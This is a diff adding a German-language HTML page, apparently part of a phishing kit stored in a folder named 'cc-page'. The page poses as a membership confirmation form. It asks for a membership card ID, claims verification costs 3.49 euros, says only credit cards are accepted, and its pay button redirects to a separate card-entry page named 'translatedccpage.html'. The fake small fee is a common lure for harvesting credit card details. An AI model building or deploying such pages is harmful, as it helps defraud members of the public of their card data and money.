@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<!-- saved from url=(0102)file:///C:/Users/PC/Documents/all%20coding%20folder/my%20first%20html/Chris-Savaj/cc-page/verifty.html -->
+<html lang="de" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formular zur Bestätigung der Mitgliedschaft</title>
+    <link rel="stylesheet" href="file:///C:/Users/PC/Documents/all%20coding%20folder/my%20first%20html/Chris-Savaj/cc-page/style.css">
+    <!-- Boxicons CSS -->
+    <link href="boxicons.min.css" rel="stylesheet">
+      
+  <link type="text/css" rel="stylesheet" charset="UTF-8" href="m=el_main_css"></head>
+  <body>
+    <div class="body">
+    <div class="container">
+      <header>
+        <i class="bx bxs-check-shield"></i>
+      </header>
+      <h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Geben Sie Ihre Mitgliedskarten-ID ein</font></font></h4>
+      <form action="">
+        <div class="input-field">
+          <input type="number">
+         
+        </div>
+        <div class="footer"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Die Kartenüberprüfung kostet Sie 3,49 €</font></font></div>
+        
+       
+      </form>
+      <button onclick="redirect()" class="button"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zahlen Sie 3,49 €</font></font></button>
+    </div>
+    <div class="footerd"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hinweis: Es werden nur Kreditkartenzahlungen akzeptiert</font></font></div>
+    </div>
+     <script>
+      function redirect() {
+        setTimeout(() => {
+    window.location.href = "translatedccpage.html"; 
+  }, 1000);
+      }
+    </script>
+    <style>
+        /* Import Google font - Poppins */
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap");
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Poppins", sans-serif;
+  
+}
+body {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #ecdff2;
+}
+:where(.container, form, .input-field, header) {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+.container {
+  background:  #efeaf1;
+  padding: 30px 30px;
+  border-radius: 12px;
+  row-gap: 20px;
+  box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+}
+.footer {
+    font-size: 12px;
+    width: 80%;
+    display: flex;
+    justify-content: center;
+    text-align: center;
+    margin-top: 15px;
+}
+.container header {
+  height: 65px;
+  width: 65px;
+  background: #ffffff;
+  color: #fff;
+  font-size: 2.5rem;
+  border-radius: 50%;
+}
+.container h4 {
+  font-size: 1.25rem;
+  color: #333;
+  font-weight: 500;
+}
+form .input-field {
+  flex-direction: row;
+  column-gap: 10px;
+}
+.input-field input {
+  height: 45px;
+  width: 150px;
+  border-radius: 6px;
+  outline: none;
+  font-size: 1.125rem;
+  text-align: center;
+  border: 1px solid #ddd;
+}
+.input-field input:focus {
+  box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
+}
+.input-field input::-webkit-inner-spin-button,
+.input-field input::-webkit-outer-spin-button {
+  display: none;
+}
+ .button {
+  margin-top: 25px;
+  width: 150px;
+  color: #fff;
+  font-size: 1rem;
+  border: none;
+  padding: 9px 15px;
+  cursor: pointer;
+  border-radius: 6px;
+  
+  background: #b45dd9;
+  transition: all 0.2s ease;
+}
+form button.active {
+  background: #7c3f96;
+ 
+}
+form button:hover {
+  background: #68397c;
+}
+.body {
+    display: flex;
+    flex-direction: column;
+}
+.footerd {
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    font-size: 12px;
+    margin-top: 15px;
+}
+
+    </style>
+    
+  
+ 
+
+</body></html>
